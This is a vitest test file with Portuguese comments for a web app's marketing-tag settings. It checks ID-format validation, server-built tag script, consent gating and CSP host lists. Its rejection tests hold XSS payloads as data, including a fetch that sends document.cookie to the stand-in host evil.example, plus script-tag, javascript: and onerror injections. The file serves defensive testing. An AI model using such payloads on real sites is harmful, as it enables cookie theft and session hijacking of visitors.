import { describe, it, expect } from 'vitest';
import { marketingTagsSchema, updateMarketingTagsSchema } from '../shared/schemas';
import { hostsParaCsp, type TagsMarketing } from '../server/marketing/tags-store';
import { tagsScript, metasDeVerificacao, tagsNoscript } from '../server/marketing/tags-script';

/**
 * As tags de marketing entram por identificador — nunca por script.
 *
 * O campo "cole aqui o código do Google" é o jeito natural de construir isto, e
 * é um buraco de XSS com aparência de recurso: uma conta de admin comprometida
 * passaria a executar JavaScript em toda página do site, para todo visitante,
 * sem deixar rastro no repositório.
 *
 * Estes testes cobram as três defesas: o formato na entrada, o servidor sendo
 * quem monta o trecho, e o consentimento antes de qualquer carga.
 */

const base: TagsMarketing = {
  gtmId: '',
  ga4Id: '',
  metaPixelId: '',
  googleSiteVerification: '',
  facebookDomainVerification: '',
  exigirConsentimento: true,
  ativo: true,
  updatedAt: new Date(0).toISOString(),
};

describe('o que o admin consegue gravar', () => {
  it('aceita os formatos dos provedores', () => {
    const r = marketingTagsSchema.safeParse({
      gtmId: 'GTM-ABC1234',
      ga4Id: 'G-ABCDE12345',
      metaPixelId: '1234567890123456',
      googleSiteVerification: 'abcdefghij0123456789_-abcdef',
      facebookDomainVerification: 'a1b2c3d4e5f6g7h8i9j0',
      exigirConsentimento: true,
      ativo: true,
    });
    expect(r.success).toBe(true);
  });

  it('recusa script colado no campo — em qualquer um deles', () => {
    const veneno = [
      '<script>alert(1)</script>',
      "GTM-ABC1234'; fetch('https://evil.example/'+document.cookie); //",
      'javascript:alert(1)',
      '"><img src=x onerror=alert(1)>',
    ];
    for (const campo of [
      'gtmId',
      'ga4Id',
      'metaPixelId',
      'googleSiteVerification',
      'facebookDomainVerification',
    ] as const) {
      for (const v of veneno) {
        const r = updateMarketingTagsSchema.safeParse({ [campo]: v });
        expect(r.success, `${campo} aceitou "${v.slice(0, 24)}"`).toBe(false);
      }
    }
  });

  it('string vazia é o jeito de limpar um campo, e continua válida', () => {
    const r = updateMarketingTagsSchema.safeParse({ gtmId: '', metaPixelId: '' });
    expect(r.success).toBe(true);
  });
});

describe('o trecho que vai para o navegador é montado pelo servidor', () => {
  it('sem nada cadastrado, não emite carga nenhuma', () => {
    const js = tagsScript(base);
    expect(js).not.toContain('googletagmanager.com/gtm.js');
    expect(js).not.toContain('connect.facebook.net');
    // Nem o carregador é emitido: quem não usa provedor não leva as URLs dos
    // provedores no HTML.
    expect(js).toContain('sem tag de marketing configurada');
  });

  it('com GTM, carrega o GTM e não duplica com o GA4', () => {
    const js = tagsScript({ ...base, gtmId: 'GTM-ABC1234', ga4Id: 'G-ABCDE12345' });
    expect(js).toContain('"GTM-ABC1234"');
    expect(js).toContain('googletagmanager.com/gtm.js');
    // O GA4 entra por dentro do GTM; carregar os dois contaria a visita duas vezes.
    expect(js).toContain('} else if(CFG.ga4){');
  });

  it('espera o consentimento quando ele é exigido', () => {
    const js = tagsScript({ ...base, metaPixelId: '1234567890123456' });
    expect(js).toContain('CFG.aceite');
    expect(js).toContain("if(!CFG.aceite || consentiu()) { carregar(); }");
    expect(js).toContain("document.addEventListener('pco:consentimento', carregar)");
  });

  it('o interruptor geral desliga tudo sem apagar o cadastro', () => {
    const js = tagsScript({ ...base, gtmId: 'GTM-ABC1234', metaPixelId: '999999999999', ativo: false });
    expect(js).not.toContain('GTM-ABC1234');
    expect(js).not.toContain('999999999999');
  });

  it('identificador estranho não atravessa nem se estiver gravado', () => {
    // Segunda peneira: o schema é a primeira, mas ele mora longe e alguém pode
    // gravar por outro caminho um dia.
    const js = tagsScript({ ...base, gtmId: "GTM-X');evil(" });
    expect(js).not.toContain('evil');
  });
});

describe('metas de verificação e noscript', () => {
  it('emite a meta do Google quando o conteúdo tem cara de conteúdo', () => {
    const m = metasDeVerificacao({ ...base, googleSiteVerification: 'abcdefghij0123456789_-abc' });
    expect(m).toContain('name="google-site-verification"');
  });

  it('não emite meta com lixo dentro', () => {
    const m = metasDeVerificacao({ ...base, googleSiteVerification: '"><script>x</script>' });
    expect(m).toBe('');
  });

  it('não emite noscript quando o site exige consentimento', () => {
    // Sem JavaScript não há como pedir nem respeitar consentimento; emitir o
    // pixel assim mesmo seria contornar a própria regra.
    const n = tagsNoscript({ ...base, gtmId: 'GTM-ABC1234', exigirConsentimento: true });
    expect(n).toBe('');
  });

  it('emite noscript quando o site não exige consentimento', () => {
    const n = tagsNoscript({ ...base, gtmId: 'GTM-ABC1234', exigirConsentimento: false });
    expect(n).toContain('googletagmanager.com/ns.html?id=GTM-ABC1234');
  });
});

describe('a CSP só afrouxa o que está em uso', () => {
  it('sem tag, não libera host nenhum', () => {
    const h = hostsParaCsp(base);
    expect(h.script).toEqual([]);
    expect(h.frame).toEqual([]);
  });

  it('com GTM, libera o googletagmanager — e não o facebook', () => {
    const h = hostsParaCsp({ ...base, gtmId: 'GTM-ABC1234' });
    expect(h.script).toContain('https://www.googletagmanager.com');
    expect(h.script).not.toContain('https://connect.facebook.net');
  });

  it('com pixel, libera o facebook — e não o googletagmanager', () => {
    const h = hostsParaCsp({ ...base, metaPixelId: '1234567890123456' });
    expect(h.script).toContain('https://connect.facebook.net');
    expect(h.script).not.toContain('https://www.googletagmanager.com');
  });

  it('desligado, não libera nada mesmo com tudo cadastrado', () => {
    const h = hostsParaCsp({ ...base, gtmId: 'GTM-ABC1234', metaPixelId: '123456789012', ativo: false });
    expect(h.script).toEqual([]);
  });
});
